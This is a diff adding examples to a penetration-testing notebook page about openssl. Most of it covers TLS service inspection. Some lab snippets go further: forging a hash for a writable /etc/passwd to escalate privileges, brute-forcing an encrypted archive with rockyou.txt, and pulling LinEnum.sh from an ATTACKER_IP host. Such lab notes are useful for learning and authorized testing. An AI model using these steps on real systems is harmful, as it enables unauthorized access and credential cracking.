@@ -9,6 +9,106 @@ hideFooterPagination: true
 
 {/* Generated from Commands/openssl.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## openssl: choose the operation and read the result
+
+Inspect TLS services or use saved encryption commands.
+
+### What the result establishes
+
+Inspect the peer certificate and protocol negotiation, then distinguish TLS success from application-protocol success.
+
+### Prerequisites and common failures
+
+SNI, certificate names, trust and explicit STARTTLS differ from connecting directly to an implicit-TLS port.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+openssl s_client -connect TARGET_IP:993
+openssl s_client -starttls smtp -connect TARGET_IP:587
+```
+
+### Example 2: Connecting by hand
+
+Run in: **Saved lab example**.
+
+```bash
+# Plaintext
+nc <IP> 110          # POP3
+nc <IP> 143          # IMAP
+
+# Encrypted (use these when only 993/995 are open, or to upgrade a plain port)
+openssl s_client -connect <IP>:995                    # POP3S
+openssl s_client -connect <IP>:110 -starttls pop3     # upgrade plain POP3 to TLS
+openssl s_client -connect <IP>:143 -starttls imap     # upgrade plain IMAP to TLS
+```
+
+Saved context: [Read and Search Email with POP3 and IMAP — Connecting by hand](/enumeration/email-enumeration-manipulation-pop3-imap#connecting-by-hand). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Interesting capabilities
+
+Run in: **Saved lab example**.
+
+```powershell
+$ getcap openssl /usr/bin/openssl 
+openssl=ep
+```
+
+Saved context: [Linux Privilege Escalation: Full Checklist — Interesting capabilities](/privesc/linux-privesc-checklist#interesting-capabilities). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: OpenSSL-encrypted GZIP (.gzip that isn't really gzip)
+
+Run in: **Saved lab example**.
+
+```bash
+file GZIP.gzip                       # -> "openssl enc'd data with salted password"
+```
+
+Saved context: [Password Attacks: Cracking, Files, and Credential Stores — OpenSSL-encrypted GZIP (.gzip that isn't really gzip)](/password-attacks/password-attacks-cheat-sheet#openssl-encrypted-gzip-gzip-that-isnt-really-gzip). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Writable /etc/passwd
+
+Run in: **Saved lab example**.
+
+```powershell
+openssl passwd -1 -salt hacker hacker
+mkpasswd -m SHA-512 hacker
+python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
+```
+
+Saved context: [Linux Privilege Escalation: Full Checklist — Writable /etc/passwd](/privesc/linux-privesc-checklist#writable-/etc/passwd). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: OpenSSL-encrypted GZIP (.gzip that isn't really gzip)
+
+Run in: **Saved lab example**.
+
+```bash
+for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
+ls    # a new extracted file appears if a password worked
+```
+
+Saved context: [Password Attacks: Cracking, Files, and Credential Stores — OpenSSL-encrypted GZIP (.gzip that isn't really gzip)](/password-attacks/password-attacks-cheat-sheet#openssl-encrypted-gzip-gzip-that-isnt-really-gzip). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Linux — OpenSSL Encryption
+
+Run in: **Saved lab example**.
+
+```bash
+# Encrypt
+openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+
+# Decrypt
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+```
+
+Saved context: [File Transfers for Linux and Windows — Linux — OpenSSL Encryption](/post-exploitation/file-transfers-cheat-sheet#linux-—-openssl-encryption). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Inspect TLS services or use saved encryption commands.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=openssl) · [All tools](/index)
@@ -21,6 +121,13 @@ Replace UPPER_CASE values with your lab values.
 openssl s_client -connect TARGET_IP:993
 openssl s_client -starttls smtp -connect TARGET_IP:587
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 1: Commands](/enumeration/citrix-netscaler#example-1-commands-2) · [Read and Search Email with POP3 and IMAP — Example 1: Commands](/enumeration/email-enumeration-manipulation-pop3-imap#example-1-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
@@ -45,6 +152,13 @@ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/Lin
 openssl s_client -connect <ATTACKER_IP>:80 -quiet > LinEnum.sh
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Linux LOLBins](/post-exploitation/file-transfers-cheat-sheet#linux-lolbins)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Linux — OpenSSL Encryption">
@@ -60,6 +174,13 @@ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
 # Decrypt
 openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 7: Linux — OpenSSL Encryption](/enumeration/citrix-netscaler#example-7-linux-—-openssl-encryption) · [Read and Search Email with POP3 and IMAP — Example 7: Linux — OpenSSL Encryption](/enumeration/email-enumeration-manipulation-pop3-imap#example-7-linux-—-openssl-encryption) · [File Transfers for Linux and Windows — Linux — OpenSSL Encryption](/post-exploitation/file-transfers-cheat-sheet#linux-—-openssl-encryption)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -97,6 +218,13 @@ UPLOADING FROM LINUX:
 └── Nothing works?      → Start python3 -m http.server on target, wget from attacker
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Web Upload (Python uploadserver with HTTPS)">
@@ -111,6 +239,13 @@ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sh
 mkdir https && cd https
 sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Web Upload (Python uploadserver with HTTPS)](/post-exploitation/file-transfers-cheat-sheet#web-upload-python-uploadserver-with-https)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -141,6 +276,13 @@ curl -k imaps://<IP> -u '<user>:<pass>'
 curl -k imaps://<IP>/INBOX -u '<user>:<pass>'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — IMAP (Port 143 / 993 SSL)](/enumeration/footprinting-lab-methodology-cheat-sheet#imap-port-143-/-993-ssl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="POP3 (Port 110 / 995 SSL)">
@@ -169,6 +311,13 @@ QUIT
 curl -k pop3s://<IP> -u '<user>:<pass>'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — POP3 (Port 110 / 995 SSL)](/enumeration/footprinting-lab-methodology-cheat-sheet#pop3-port-110-/-995-ssl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Interesting capabilities">
@@ -181,6 +330,13 @@ curl -k pop3s://<IP> -u '<user>:<pass>'
 $ getcap openssl /usr/bin/openssl 
 openssl=ep
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 3: Interesting capabilities](/enumeration/citrix-netscaler#example-3-interesting-capabilities) · [Read and Search Email with POP3 and IMAP — Example 3: Interesting capabilities](/enumeration/email-enumeration-manipulation-pop3-imap#example-3-interesting-capabilities) · [Linux Privilege Escalation: Full Checklist — Interesting capabilities](/privesc/linux-privesc-checklist#interesting-capabilities)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -196,6 +352,13 @@ mkpasswd -m SHA-512 hacker
 python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 5: Writable /etc/passwd](/enumeration/citrix-netscaler#example-5-writable-/etc/passwd) · [Read and Search Email with POP3 and IMAP — Example 5: Writable /etc/passwd](/enumeration/email-enumeration-manipulation-pop3-imap#example-5-writable-/etc/passwd) · [Linux Privilege Escalation: Full Checklist — Writable /etc/passwd](/privesc/linux-privesc-checklist#writable-/etc/passwd)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="OpenSSL-encrypted GZIP (.gzip that isn&#x27;t really gzip)">
@@ -208,12 +371,26 @@ python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
 file GZIP.gzip                       # -> "openssl enc'd data with salted password"
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 4: OpenSSL-encrypted GZIP (.gzip that isn't really gzip)](/enumeration/citrix-netscaler#example-4-openssl-encrypted-gzip-gzip-that-isnt-really-gzip) · [Read and Search Email with POP3 and IMAP — Example 4: OpenSSL-encrypted GZIP (.gzip that isn't really gzip)](/enumeration/email-enumeration-manipulation-pop3-imap#example-4-openssl-encrypted-gzip-gzip-that-isnt-really-gzip) · [Password Attacks: Cracking, Files, and Credential Stores — OpenSSL-encrypted GZIP (.gzip that isn't really gzip)](/password-attacks/password-attacks-cheat-sheet#openssl-encrypted-gzip-gzip-that-isnt-really-gzip)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Password Attacks: Cracking, Files, and Credential Stores**
 
 ```bash
 for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
 ls    # a new extracted file appears if a password worked
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: OpenSSL-encrypted GZIP (.gzip that isn't really gzip)](/enumeration/citrix-netscaler#example-6-openssl-encrypted-gzip-gzip-that-isnt-really-gzip) · [Read and Search Email with POP3 and IMAP — Example 6: OpenSSL-encrypted GZIP (.gzip that isn't really gzip)](/enumeration/email-enumeration-manipulation-pop3-imap#example-6-openssl-encrypted-gzip-gzip-that-isnt-really-gzip) · [Password Attacks: Cracking, Files, and Credential Stores — OpenSSL-encrypted GZIP (.gzip that isn't really gzip)](/password-attacks/password-attacks-cheat-sheet#openssl-encrypted-gzip-gzip-that-isnt-really-gzip)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -234,6 +411,13 @@ openssl s_client -connect <IP>:110 -starttls pop3     # upgrade plain POP3 to TL
 openssl s_client -connect <IP>:143 -starttls imap     # upgrade plain IMAP to TLS
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 2: Connecting by hand](/enumeration/citrix-netscaler#example-2-connecting-by-hand) · [Read and Search Email with POP3 and IMAP — Example 2: Connecting by hand](/enumeration/email-enumeration-manipulation-pop3-imap#example-2-connecting-by-hand) · [Read and Search Email with POP3 and IMAP — Connecting by hand](/enumeration/email-enumeration-manipulation-pop3-imap#connecting-by-hand)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="File Transfer Protocols">
@@ -247,6 +431,13 @@ Context from the notebook: FTPS 990 FTP over TLS openssl s_client -connect &lt;I
 ```text
 openssl s_client -connect <IP>:21 -starttls ftp
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — File Transfer Protocols](/reference/master-protocol-service-quick-reference#file-transfer-protocols)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -262,6 +453,21 @@ Context from the notebook: Read mail over TLS:   openssl s_client -connect &lt;I
 openssl s_client -connect <IP>:993
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Signature moves & deep dive](/reference/master-protocol-service-quick-reference#signature-moves-&-deep-dive)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Read and Search Email with POP3 and IMAP](/enumeration/email-enumeration-manipulation-pop3-imap)
+
+{/* VAULT_RELATED_END */}
